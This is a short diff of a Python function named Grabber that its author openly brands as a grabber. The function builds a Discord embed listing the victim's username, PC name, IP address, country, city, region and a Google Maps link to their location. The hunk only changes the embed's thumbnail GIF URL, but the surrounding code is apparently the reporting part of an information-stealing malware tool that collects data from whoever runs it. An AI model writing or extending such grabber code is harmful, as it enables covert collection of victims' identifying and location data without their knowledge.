@@ -86,7 +86,7 @@ def Grabber():
             "description": "\n[Google Maps Location](https://www.google.com/maps/search/google+map++" + userinfo()[5] + ')' + '\n\n' +  f"**Username** : " + os.getenv('USER', os.getenv('USERNAME', 'user')) + '  **PC Name** : ' + os.getenv('COMPUTERNAME') + '  \n**IP** : ' + userinfo()[0] + ' \n**Country** : ' + userinfo()[4] + '  **City**: ' + userinfo()[2] + '  **Region** : ' + userinfo()[3],
             "color": 0x58D3F7,
             "thumbnail":{
-                "url":"https://cdn.discordapp.com/attachments/862163169484472380/999096422198685757/a_9fa03182837bff68763b3a24b6639cb2.gif"
+                "url":"https://cdn.discordapp.com/attachments/910931131128500306/969447606331785226/DefiniteSingleDeermouse-size_restricted.gif"
                 },
             "footer": {
                 "text": f" Grabber By 𝙭𝙖𝙣𝙣 𝙬𝙧𝙡𝙙#0101 | https://github.com/xannbtw"
